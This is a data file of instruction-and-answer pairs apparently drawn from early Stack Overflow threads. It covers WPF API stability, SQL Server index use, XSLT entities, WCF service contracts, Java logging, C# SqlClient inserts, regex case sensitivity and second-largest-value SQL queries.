{"instruction": "How stable is WPF not in terms of stability of a WPF program, but in terms of the 'stability' of the API itself.  \nLet me explain:  \nMicrosoft is notorious for changing its whole methodology around with new technology. Like with the move from silverlight 1 to silverlight 2. With WPF, I know that MS changed a bunch of stuff with the release of the .NET service pack. I don't know how much they changed things around. So the bottom line is, in your opinion are they going to revamp the system again with the next release or do you think that it is stable enough now that they won't change the bulk of the system. I hate to have to unlearn stuff with every release.  \nI hope that the question wasn't too long winded.", "output": "MS do have a history of \"fire and movement\" with regards to introducing new technology into their development stack, but they also have a strong history of maintaining support for the older stuff, and backwards-compatibility. WPF seems to be getting stuff added to it with each new release of the framework but the things you learn aren't being superceded or invalidated.\nThe only breaking change I've seen in my own WPF applications with a new release of the framework was one recently in 3.5 SP1, and that was because we were unknowingly relying on a bug to get a certain behaviour from our code. We adjusted the XAML to be more correct and it started working fine.\nSo yeah, I think WPF is pretty \"stable\" as a client-side development technology."}
{"instruction": "How stable is WPF not in terms of stability of a WPF program, but in terms of the 'stability' of the API itself.  \nLet me explain:  \nMicrosoft is notorious for changing its whole methodology around with new technology. Like with the move from silverlight 1 to silverlight 2. With WPF, I know that MS changed a bunch of stuff with the release of the .NET service pack. I don't know how much they changed things around. So the bottom line is, in your opinion are they going to revamp the system again with the next release or do you think that it is stable enough now that they won't change the bulk of the system. I hate to have to unlearn stuff with every release.  \nI hope that the question wasn't too long winded.", "output": "We've been using WPF since it was first released and yes it had it's problems at the beginning that caused us headaches and had us scratching our heads to find a work around, but each new update the stack has actually become pretty stable.\nIt definitely became easier and easier to develop with it with the addition of Expression Blend.  Creating the XAML in VS 2005 was not fun.  The templating engine alone is enough to switch from WinForms, let alone the animation support.\nEither way, I agree with Matt that it is pretty stable as a framework for developing client applications."}
{"instruction": "If I have a query like:\nSelect EmployeeId \nFrom Employee \nWhere EmployeeTypeId IN (1,2,3)\n\nand I have an index on the EmployeeTypeId field, does SQL server still use that index?", "output": "Usually it would, unless the IN clause covers too much of the table, and then it will do a table scan.  Best way to find out in your specific case would be to run it in the query analyzer, and check out the execution plan."}
{"instruction": "If I have a query like:\nSelect EmployeeId \nFrom Employee \nWhere EmployeeTypeId IN (1,2,3)\n\nand I have an index on the EmployeeTypeId field, does SQL server still use that index?", "output": "Yeah, that's right.  If your employee table has 10,000 records, and only 5 records have employeetypeID in (1,2,3), then it will most likely use the index to fetch the records.  However, if it finds that 9,000 records have the employeeIDType in (1,2,3), then it would most likely just do a table scan to get the corresponding EmployeeIDs, as it's faster just to run through the whole table than to go to each branch of the index tree and look at the records individually.  \nSQL Server does a lot of stuff to try and optimize how the queries run.  However, sometimes it doesn't get the right answer.  If you know that SQL Server isn't using the index, by looking at the execution plan in query analyzer, you can tell the query engine to use a specific index with the following change to your query.\nSelect EmployeeId From Employee WITH (Index(Index_EmployeeTypeId )) Where EmployeeTypeId IN (1,2,3)\n\nAssuming the index you have on the EmployeeTypeId field is named Index_EmployeeTypeId."}
{"instruction": "How stable is WPF not in terms of stability of a WPF program, but in terms of the 'stability' of the API itself.  \nLet me explain:  \nMicrosoft is notorious for changing its whole methodology around with new technology. Like with the move from silverlight 1 to silverlight 2. With WPF, I know that MS changed a bunch of stuff with the release of the .NET service pack. I don't know how much they changed things around. So the bottom line is, in your opinion are they going to revamp the system again with the next release or do you think that it is stable enough now that they won't change the bulk of the system. I hate to have to unlearn stuff with every release.  \nI hope that the question wasn't too long winded.", "output": "WPF is pretty stable as far as changes go.  Silverlight is still in flux.  Though you may watch out since silverlight brought the concept of the state manager(instead of implementing triggers) which may get adopted in wpf... \nIf that happens there will be multiple ways to defining control templates and behavior...\nand that will be a headache."}
{"instruction": "I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.\nFrom what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?\nWhere is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python.", "output": "Use threads in python if the individual workers are doing I/O bound operations. If you are trying to scale across multiple cores on a machine either find a good IPC framework for python or pick a different language."}
{"instruction": "The Wikipedia article on ANSI C says:\n\nOne of the aims of the ANSI C standardization process was to produce a superset of K&R C (the first published standard), incorporating many of the unofficial features subsequently introduced. However, the standards committee also included several new features, such as function prototypes (borrowed from the C++ programming language), and a more capable preprocessor. The syntax for parameter declarations was also changed to reflect the C++ style.\n\nThat makes me think that there are differences. However, I didn't see a comparison between K&R C and ANSI C. Is there such a document? If not, what are the major differences?\nEDIT: I believe the K&R book says \"ANSI C\" on the cover. At least I believe the version that I have at home does. So perhaps there isn't a difference anymore?", "output": "Function prototypes were the most obvious change between K&R C and C89, but there were plenty of others.  A lot of important work went into standardizing the C library, too.  Even though the standard C library was a codification of existing practice, it codified multiple existing practices, which made it more difficult.  P.J. Plauger's book, The Standard C Library, is a great reference, and also tells some of the behind-the-scenes details of why the library ended up the way it did.\nThe ANSI/ISO standard C is very similar to K&R C in most ways.  It was intended that most existing C code should build on ANSI compilers without many changes.  Crucially, though, in the pre-standard era, the semantics of the language were open to interpretation by each compiler vendor.  ANSI C brought in a common description of language semantics which put all the compilers on an equal footing.  It's easy to take this for granted now, some 20 years later, but this was a significant achievement.\nFor the most part, if you don't have a pre-standard C codebase to maintain, you should be glad you don't have to worry about it.  If you do--or worse yet, if you're trying to bring an old program up to more modern standards--then you have my sympathies."}
{"instruction": "If I have a query like:\nSelect EmployeeId \nFrom Employee \nWhere EmployeeTypeId IN (1,2,3)\n\nand I have an index on the EmployeeTypeId field, does SQL server still use that index?", "output": "So there's the potential for an \"IN\" clause to run a table scan, but the optimizer will \n  try and work out the best way to deal with it?\n\nWhether an index is used doesn't so much vary on the type of query as much of the type and distribution of data in the table(s), how up-to-date your table statistics are, and the actual datatype of the column.\nThe other posters are correct that an index will be used over a table scan if:\n\nThe query won't access more than a certain percent of the rows indexed (say ~10% but should vary between DBMS's).\nAlternatively, if there are a lot of rows, but relatively few unique values in the column, it also may be faster to do a table scan.\n\nThe other variable that might not be that obvious is making sure that the datatypes of the values being compared are the same. In PostgreSQL, I don't think that indexes will be used if you're filtering on a float but your column is made up of ints. There are also some operators that don't support index use (again, in PostgreSQL, the ILIKE operator is like this).\nAs noted though, always check the query analyser when in doubt and your DBMS's documentation is your friend."}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "I used to use NUnit, but now tend to use MbUnit, for two key features:\n1. The RowTest feature allows you to easily run the same test on different sets of parameters, which is important if you really want thorough coverage.\n2. The Rollback feature allows you to run tests against your database while rolling back changes after every test, keeping your database in exactly the same state every time. And it's as easy as adding the [Rollback] attribute.\nAnother nice aspect of MbUnit is that its syntax is nearly identical to NUnit, so if you have a whole test bed already in place under NUnit, you can just switch out the references without the need to change any (very much?) code."}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "Have a look at the Guided tour of WPF by Josh Smith. I also really like Adam's Nathan book WPF Presentation Unleashed."}
{"instruction": "How many ServiceContracts can a WCF service have?\nSpecifically, since a ServiceContract is an attribute to an interface, how many interfaces can I code into one WCF web service? Is it a one-to-one?\nDoes it make sense to separate the contracts across multiple web services?", "output": "You can have a service implement all the service contracts you want. I mean, I don't know if there is a limit, but I don't think there is.\nThat's a neat way to separate operations that will be implemented by the same service in several conceptually different service contract interfaces."}
{"instruction": "How many ServiceContracts can a WCF service have?\nSpecifically, since a ServiceContract is an attribute to an interface, how many interfaces can I code into one WCF web service? Is it a one-to-one?\nDoes it make sense to separate the contracts across multiple web services?", "output": "@jdiaz\nOf course you should strive to have very different business matters in different services, but consider the case in which you want that, for example, all your services implement a GetVersion() operation. You could have a service contract just for that operation and have every service implement it, instead of adding the GetVersion() operation to the contract of all your services."}
{"instruction": "How many ServiceContracts can a WCF service have?\nSpecifically, since a ServiceContract is an attribute to an interface, how many interfaces can I code into one WCF web service? Is it a one-to-one?\nDoes it make sense to separate the contracts across multiple web services?", "output": "A service can theoretically have any number of Endpoints, and each Endpoint is bound to a particular contract, or interface, so it is possible for a single conceptual (and configured) service to host multiple interfaces via multiple endpoints or alternatively for several endpoints to host the same interface.\nIf you are using the ServiceHost class to host your service, though, instead of IIS, you can only associate a single interface per ServiceHost. I'm not sure why this is the case, but it is."}
{"instruction": "How many ServiceContracts can a WCF service have?\nSpecifically, since a ServiceContract is an attribute to an interface, how many interfaces can I code into one WCF web service? Is it a one-to-one?\nDoes it make sense to separate the contracts across multiple web services?", "output": "WCF services can have multiple endpoints, each of which can implement a different service contract.\nFor example, you could have a service declared as follows:\n[ServiceBehavior(Namespace = \"DemoService\")]\npublic class DemoService : IDemoService, IDoNothingService\n\nWhich would have configuration along these lines:\n<service name=\"DemoService\" behaviorConfiguration=\"Debugging\">\n  <host>\n    <baseAddresses>\n      <add baseAddress = \"http://localhost/DemoService.svc\" />\n    </baseAddresses>\n  </host>\n  <endpoint \n    address =\"\"\n    binding=\"customBinding\"\n    bindingConfiguration=\"InsecureCustom\"\n    bindingNamespace=\"http://schemas.com/Demo\" contract=\"IDemoService\"/>\n  <endpoint \n    address =\"\"\n    binding=\"customBinding\"\n    bindingConfiguration=\"InsecureCustom\"\n    bindingNamespace=\"http://schemas.com/Demo\" contract=\"IDoNothingService\"/>\n</service>\n\nHope that helps, but if you were after the theoretical maximum interfaces you can have for a service I suspect it's some crazily large multiple of 2."}
{"instruction": "I'm building a RESTful web service which has multiple URIs for one of its resources, because there is more than one unique identifier. Should the server respond to a GET request for an alternate URI by returning the resource, or should I send an HTTP 3xx redirect to the canonical URI? Is HTTP 303 (see also) the most appropriate redirect?\nClarification: the HTTP specification makes it clear that the choice of redirect depends on which URI future requests should use. In my application, the 'canonical' URI is the most stable of the alternatives; an alternative URI will always direct to same canonical URI, or become invalid.", "output": "I'd personally plump for returning the resource rather than faffing with a redirect, although I suspect that's only because my subcoscious is telling me redirects are slower.\nHowever, if you were to decide to use a redirect I'd think a 302 or 307 might be more appropiate than a 303, although the w3.org has details of the different redirect codes you could use."}
{"instruction": "I'm building a RESTful web service which has multiple URIs for one of its resources, because there is more than one unique identifier. Should the server respond to a GET request for an alternate URI by returning the resource, or should I send an HTTP 3xx redirect to the canonical URI? Is HTTP 303 (see also) the most appropriate redirect?\nClarification: the HTTP specification makes it clear that the choice of redirect depends on which URI future requests should use. In my application, the 'canonical' URI is the most stable of the alternatives; an alternative URI will always direct to same canonical URI, or become invalid.", "output": "Under W3C's Architexture of the World Wide Web, Volume One, there is a section on URI aliases (Section 2.3.1) which states the following:\n\"When a URI alias does become common currency, the URI owner should use protocol techniques such as server-side redirects to relate the two resources. The community benefits when the URI owner supports redirection of an aliased URI to the corresponding \"official\" URI. For more information on redirection, see section 10.3, Redirection, in RFC2616. See also CHIPS for a discussion of some best practices for server administrators.\"\nFor what it's worth, I would recommend a 302 redirect."}
{"instruction": "Is it still worth to add the log4j library to a Java 5 project just to log\nlet's say some exceptions to a file with some nice rollover settings.\nOr will the standard util.logging facility do the job as well?\nWhat do you think?", "output": "I'd say you're probably fine with util.logging for the needs you describe.\nFor a good decision tree, have a look at Log4j vs java.util.logging\n\nQuestion One :\n  Do you anticipate a need for any of the clever handlers that Log4j has that JUL does not have, such as the SMTPHandler, NTEventLogHandler, or any of the very convenient FileHandlers?\nQuestion Two :\n  Do you see yourself wanting to frequently switch the format of your logging output? Will you need an easy, flexible way to do so? In other words, do you need Log4j's PatternLayout?\nQuestion Three :\n  Do you anticipate a definite need for the ability to change complex logging configurations in your applications, after they are compiled and deployed in a production environment? Does your configuration sound something like, \"Severe messages from this class get sent via e-mail to the support guy; severe messages from a subset of classes get logged to a syslog deamon on our server; warning messages from another subset of classes get logged to a file on network drive A; and then all messages from everywhere get logged to a file on network drive B\"? And do you see yourself tweaking it every couple of days?\nIf you can answer yes to any of the above questions, go with Log4j. If you answer a definite no to all of them, JUL will be more than adequate and it's conveniently already included in the SDK.\n\nThat said, pretty much every project these days seems to wind up including log4j, if only because some other library uses it."}
{"instruction": "Is it still worth to add the log4j library to a Java 5 project just to log\nlet's say some exceptions to a file with some nice rollover settings.\nOr will the standard util.logging facility do the job as well?\nWhat do you think?", "output": "I would go with log4j. The possibilites with log4j is not obsolete at all!"}
{"instruction": "What is the best way to include an html entity in XSLT?\n<xsl:template match=\"/a/node\">\n    <xsl:value-of select=\".\"/>\n    <xsl:text>&nbsp;</xsl:text>\n</xsl:template>\n\nthis one returns a XsltParseError", "output": "You can use CDATA section\n<xsl:text disable-output-escaping=\"yes\"><![CDATA[&nbsp;]]></xsl:text>\n\nor you can describe &nbsp in local DTD:\n<!DOCTYPE xsl:stylesheet [ <!ENTITY nbsp \"&#160;\"> ]>\n\nor just use &#160; instead of &nbsp;"}
{"instruction": "If I have a query like:\nSelect EmployeeId \nFrom Employee \nWhere EmployeeTypeId IN (1,2,3)\n\nand I have an index on the EmployeeTypeId field, does SQL server still use that index?", "output": "Unless technology has improved in ways I can't imagine of late, the \"IN\" query shown will produce a result that's effectively the OR-ing of three result sets, one for each of the values in the \"IN\" list. The IN clause becomes an equality condition for each of the list and will use an index if appropriate. In the case of unique IDs and a large enough table then I'd expect the optimiser to use an index.\nIf the items in the list were to be non-unique however, and I guess in the example that a \"TypeId\" is a foreign key, then I'm more interested in the distribution. I'm wondering if the optimiser will check the stats for each value in the list? Say it checks the first value and finds it's in 20% of the rows (of a large enough table to matter). It'll probably table scan. But will the same query plan be used for the other two, even if they're unique?\nIt's probably moot - something like an Employee table is likely to be small enough that it will stay cached in memory and you probably wouldn't notice a difference between that and indexed retrieval anyway.\nAnd lastly, while I'm preaching, beware the query in the IN clause: it's often a quick way to get something working and (for me at least) can be a good way to express the requirement, but it's almost always better restated as a join. Your optimiser may be smart enough to spot this, but then again it may not. If you don't currently performance-check against production data volumes, do so - in these days of cost-based optimisation you can't be certain of the query plan until you have a full load and representative statistics. If you can't, then be prepared for surprises in production..."}
{"instruction": "What is the best way to include an html entity in XSLT?\n<xsl:template match=\"/a/node\">\n    <xsl:value-of select=\".\"/>\n    <xsl:text>&nbsp;</xsl:text>\n</xsl:template>\n\nthis one returns a XsltParseError", "output": "this one returns a XsltParseError\n\nYes, and the reason for that is that &nbsp; is not a predefined entity in XML or XSLT as it is in HTML.\nYou could just use the unicode character which &nbsp; stands for: &#160;"}
{"instruction": "What is the best way to include an html entity in XSLT?\n<xsl:template match=\"/a/node\">\n    <xsl:value-of select=\".\"/>\n    <xsl:text>&nbsp;</xsl:text>\n</xsl:template>\n\nthis one returns a XsltParseError", "output": "one other possibility to use html entities from within xslt is the following one:\n<xsl:text disable-output-escaping=\"yes\">&amp;nbsp;</xsl:text>"}
{"instruction": "What is the best way to include an html entity in XSLT?\n<xsl:template match=\"/a/node\">\n    <xsl:value-of select=\".\"/>\n    <xsl:text>&nbsp;</xsl:text>\n</xsl:template>\n\nthis one returns a XsltParseError", "output": "XSLT only handles the five basic entities by default: lt, gt, apos, quot, and amp. All others need to be defined as @Aku mentions."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "If you are curious about Seaside (mentioned by yinkei), visit Randal Schwartz's Methods and Messages. You can start by watching his quick elevator pitch.\nSeaside creator Avi Bryant's interview is also a good read/watch.\nWorking with Seaside was amazing for me, almost like coding a desktop app.\nVisit Dabble DB and Cmsbox for real life apps built on Seaside."}
{"instruction": "Is it still worth to add the log4j library to a Java 5 project just to log\nlet's say some exceptions to a file with some nice rollover settings.\nOr will the standard util.logging facility do the job as well?\nWhat do you think?", "output": "I recommend using Apache Commmons Logging as your logging interface. That way you have the flexibility to switch logging implementations anytime you want without requiring any code changes on your end."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "Why haven't anyone talked about turbogears, web.py and pylons?"}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "For Python, I recommend Pylons (docs) (book)"}
{"instruction": "This isn't much of a programming question, but I'm sure I'm not the only person here who has this issue.\nCurrently I have two machines with Outlook 2007. They both sync e-mail from Google Apps. One of the machines publishes my calendar to a secure server, which my other machine is subscribed to. The problem with this setup is that I have read-only calendar access on one of my machines, which sucks. Also soon I'll be upgrading to a smart-phone, so anything I do will also have to support that scenario.\n\nIs there a better way to handle Outlook synchronization without setting up an exchange server in my basement?\nIf I have to setup Exchange, is it possible to make it pull e-mail, via IMAP, from Google Apps?", "output": "Question 1: Yes. Plaxo.com free CMS synchronization service."}
{"instruction": "I'm basically trying to figure out the simplest way to perform your basic insert operation in C#.NET using the SqlClient namespace. \nI'm using SqlConnection for my db link, I've already had success executing some reads, and I want to know the simplest way to insert data. I'm finding what seem to be pretty verbose methods when I google.", "output": "using (var conn = new SqlConnection(yourConnectionString))\n{\n    var cmd = new SqlCommand(\"insert into Foo values (@bar)\", conn);\n    cmd.Parameters.AddWithValue(\"@bar\", 17);\n    conn.Open();\n    cmd.ExecuteNonQuery();\n}"}
{"instruction": "I'm basically trying to figure out the simplest way to perform your basic insert operation in C#.NET using the SqlClient namespace. \nI'm using SqlConnection for my db link, I've already had success executing some reads, and I want to know the simplest way to insert data. I'm finding what seem to be pretty verbose methods when I google.", "output": "using (SqlConnection myConnection new SqlConnection(\"Your connection string\")) \n{ \n    SqlCommand myCommand = new SqlCommand(\"INSERT INTO ... VALUES ...\", myConnection); \n    myConnection.Open(); \n    myCommand.ExecuteNonQuery(); \n}"}
{"instruction": "Is it still worth to add the log4j library to a Java 5 project just to log\nlet's say some exceptions to a file with some nice rollover settings.\nOr will the standard util.logging facility do the job as well?\nWhat do you think?", "output": "I recommend that you use the Simple Logging Facade for Java (SLF4J). It supports different providers that include Log4J and can be used as a replacement for Apache Commons Logging."}
{"instruction": "Source\n\nRegexOptions.IgnoreCase is more expensive than I would have thought (eg, should be barely measurable)\n\nAssuming that this applies to PHP, Python, Perl, Ruby etc as well as C# (which is what I assume Jeff was using), how much of a slowdown is it and will I incur a similar penalty with \"/[a-zA-z]/\" as I will with \"/[a-z]/i\" ?", "output": "Yes, [A-Za-z] will be much faster than setting the RegexOptions.IgnoreCase, largely because of Unicode strings. But it's also much more limiting -- [A-Za-z] does not match accented international characters, it's literally the A-Za-z ASCII set and nothing more.\nI don't know if you saw Tim Bray's answer to my message, but it's a good one:\n\nOne of the trickiest issues in internationalized search is upper and lower case. This notion of case is limited to languages written in the Latin, Greek, and Cyrillic character sets. English-speakers naturally expect search to be case-insensitive if only because they\u2019re lazy: if Nadia Jones wants to look herself up on Google she\u2019ll probably just type in nadia jones and expect the system to take care of it.\nSo it\u2019s fairly common for search systems to \u201cnormalize\u201d words by converting them all to lower- or upper-case, both for indexing and queries.\nThe trouble is that the mapping between cases is not always as straightforward as it is in English. For example, the German lower-case character \u201c\u00df\u201d becomes \u201cSS\u201d when upper-cased, and good old capital \u201cI\u201d when down-cased in Turkish becomes the dotless \u201c\u0131\u201d (yes, they have \u201ci\u201d, its upper-case version is \u201c\u0130\u201d). I have read (but not verified first-hand) that the rules for upcasing accented characters such \u201c\u00e9\u201d are different in France and Qu\u00e9bec. One of the results of all this is that software such as java.String.toLowerCase() tends to run astonishingly slow as it tries to work around all these corner-cases.\n\nhttp://www.tbray.org/ongoing/When/200x/2003/10/11/SearchI18n"}
{"instruction": "I have been working on a web services related project for about the last year.  Our team found soapUI near the start of our project and we have been mostly(*) satisfied with it (the free version, that is).\nMy question is: are there other tools/clients/frameworks that you have used/currently use for web services testing and would recommend?\n(*) There are some weird GUI glitches that appear once in a while.  As is mentioned by some of the answers, we attributed this to a memory leak.", "output": "I use soapUI, and it's generally pretty good.  Be aware that it seems to leak memory, and eventually it will no longer save your project, so save regularly!\nThis is about the only hassle I have with it (other than the general ugliness that almost every Java application has!), and I can't live without it."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "You could start looking at caching strategies. Static files like CSS (even compressed ones) and images (even optimized ones) should only need to be downloaded once by the browser for a period of time. \nScirpt combining for AJAX has already been mentioned, but I didn't notice reference to the ScriptReferenceProfiler MS has released on codeplex to help figure out what to combine. Mike Ormond has a good start point on this.\nAnother tip if you're doing a lot of INSERTs to your database is to double check your server's disk caching is switched on. Case in point, I had an data importer doing 1.2 million inserts during a run. Took 4 hours and change without caching on. Took 16 minutes with it on."}
{"instruction": "I've developed my own delivery extension for Reporting Services 2005, to integrate this with our SaaS marketing solution.\nIt takes the subscription, and takes a snapshot of the report with a custom set of parameters. It then renders the report, sends an e-mail with a link and the report attached as XLS.\nEverything works fine, until mail delivery...\nHere's my code for sending e-mail:\n public static List<string> SendMail(SubscriptionData data, Stream reportStream, string reportName, string smptServerHostname, int smtpServerPort)\n{\n  List<string> failedRecipients = new List<string>();\n\n  MailMessage emailMessage = new MailMessage(data.ReplyTo, data.To);\n  emailMessage.Priority = data.Priority;\n  emailMessage.Subject = data.Subject;\n  emailMessage.IsBodyHtml = false;\n  emailMessage.Body = data.Comment;\n\n  if (reportStream != null)\n  {\n    Attachment reportAttachment = new Attachment(reportStream, reportName);\n    emailMessage.Attachments.Add(reportAttachment);\n    reportStream.Dispose();\n  }\n\n  try\n  {\n    SmtpClient smtp = new SmtpClient(smptServerHostname, smtpServerPort);\n\n    // Send the MailMessage\n    smtp.Send(emailMessage);\n  }\n  catch (SmtpFailedRecipientsException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpFailedRecipientException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpException ex)\n  {\n    throw ex;\n  }\n  catch (Exception ex)\n  {\n    throw ex;\n  }\n\n  // Return the List of failed recipient e-mail addresses, so the client can maintain its list.\n  return failedRecipients;\n}\n\nValues for SmtpServerHostname is localhost, and port is 25.\nI veryfied that I can actually send mail, by using Telnet. And it works.\nHere's the error message I get from SSRS:\nReportingServicesService!notification!4!08/28/2008-11:26:17:: Notification 6ab32b8d-296e-47a2-8d96-09e81222985c completed.  Success: False, Status: Exception Message: Failure sending mail. Stacktrace:    at MyDeliveryExtension.MailDelivery.SendMail(SubscriptionData data, Stream reportStream, String reportName, String smptServerHostname, Int32 smtpServerPort) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MailDelivery.cs:line 48\n   at MyDeliveryExtension.MyDelivery.Deliver(Notification notification) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MyDelivery.cs:line 153, DeliveryExtension: My Delivery, Report: Clicks Development, Attempt 1\nReportingServicesService!dbpolling!4!08/28/2008-11:26:17:: NotificationPolling finished processing item 6ab32b8d-296e-47a2-8d96-09e81222985c\nCould this have something to do with Trust/Code Access Security?\nMy delivery extension is granted full trust in rssrvpolicy.config:\n   <CodeGroup \n    class=\"UnionCodeGroup\"\n    version=\"1\"\n    PermissionSetName=\"FullTrust\"\n    Name=\"MyDelivery_CodeGroup\"\n    Description=\"Code group for MyDelivery extension\">\n    <IMembershipCondition class=\"UrlMembershipCondition\" version=\"1\" Url=\"C:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\Reporting Services\\ReportServer\\bin\\MyDeliveryExtension.dll\" />\n   </CodeGroup>\n\nCould trust be an issue here?\nAnother theory: SQL Server and SSRS was installed in the security context of Local System. Am I right, or is this service account restricted access to any network resource? Even its own SMTP Server?\nI tried changing all SQL Server Services logons to Administrator - but still without any success.\nI also tried logging onto the SMTP server in my code, by proviiding: NetworkCredential(\"Administrator\", \"password\") and also NetworkCredential(\"Administrator\", \"password\", \"MyRepServer\")\nCan anyone help here, please?", "output": "What's at:\nat MyDeliveryExtension.MailDelivery.SendMail(SubscriptionData data, Stream reportStream, String reportName, String smptServerHostname, Int32 smtpServerPort) \n  in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MailDelivery.cs:line 48 \n\nat MyDeliveryExtension.MyDelivery.Deliver(Notification notification) \n  in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MyDelivery.cs:line 153\n\nAlso you seem to be disposing the report stream, but that should be done by whatever opened that stream, not your method (it won't be obvious that attaching a stream disposes it).\nYou're losing part of your stack trace due to how you re-throw exceptions. Don't throw the ex variable, just throw is enough.\nTry this tweak:\npublic static List<string> SendMail(SubscriptionData data, Stream reportStream, string reportName, string smptServerHostname, int smtpServerPort)\n{\n  List<string> failedRecipients = new List<string>();\n\n  MailMessage emailMessage = new MailMessage(data.ReplyTo, data.To) {\n      Priority = data.Priority,\n      Subject = data.Subject,\n      IsBodyHtml = false,\n      Body = data.Comment\n  };\n\n  if (reportStream != null)\n    emailMessage.Attachments.Add(new Attachment(reportStream, reportName));\n\n  try\n  {\n      SmtpClient smtp = new SmtpClient(smptServerHostname, smtpServerPort);\n\n      // Send the MailMessage\n      smtp.Send(emailMessage);\n  }\n  catch (SmtpFailedRecipientsException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n\n    //are you missing a loop here? only one failed address will ever be returned\n  }\n  catch (SmtpFailedRecipientException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n\n  // Return the List of failed recipient e-mail addresses, so the client can maintain its list.\n  return failedRecipients;\n}"}
{"instruction": "Source\n\nRegexOptions.IgnoreCase is more expensive than I would have thought (eg, should be barely measurable)\n\nAssuming that this applies to PHP, Python, Perl, Ruby etc as well as C# (which is what I assume Jeff was using), how much of a slowdown is it and will I incur a similar penalty with \"/[a-zA-z]/\" as I will with \"/[a-z]/i\" ?", "output": "If you can tolerate having numbers and underscores in that regex, you can e.g. use the \\w modifier (Perl syntax). I believe some engines support [:alpha:], but that is not pure Perl. \\w takes into account the locale you are in, and matches both uppercase and lowercase, and I bet it is faster than using [A-Z] while ignoring case."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "LINQ doesn't prohibit the use of stored procedures. I've used mixed mode with LINQ-SQL and LINQ-storedproc. Personally, I'm glad I don't have to write the stored procs....pwet-tu."}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "The easiest would be to get the second value from this result set in the application:\nSELECT DISTINCT value FROM Table ORDER BY value DESC LIMIT 2\n\nBut if you must select the second value using SQL, how about:\nSELECT MIN(value) FROM (SELECT DISTINCT value FROM Table ORDER BY value DESC LIMIT 2) AS t"}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "I suppose you can do something like:\nSELECT * FROM Table ORDER BY NumericalColumn DESC LIMIT 1 OFFSET 1\n\nor\nSELECT * FROM Table ORDER BY NumericalColumn DESC LIMIT (1, 1)\n\ndepending on your database server. Hint: SQL Server doesn't do LIMIT."}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "SELECT MAX( col )\n  FROM table\n WHERE col < ( SELECT MAX( col )\n                 FROM table )"}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "select top 1 MyIntColumn from MyTable\nwhere\n MyIntColumn <> (select top 1 MyIntColumn from MyTable order by MyIntColumn desc)\norder by MyIntColumn desc"}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "This works in MS SQL:\nselect max([COLUMN_NAME]) from [TABLE_NAME] where [COLUMN_NAME] < \n ( select max([COLUMN_NAME]) from [TABLE_NAME] )"}
{"instruction": "What is the simplest SQL query to find the second largest integer value in a specific column? \nThere are maybe duplicate values in the column.", "output": "Something like this? I haven't tested it, though:\nselect top 1 x\nfrom (\n  select top 2 distinct x \n  from y \n  order by x desc\n) z\norder by x"}
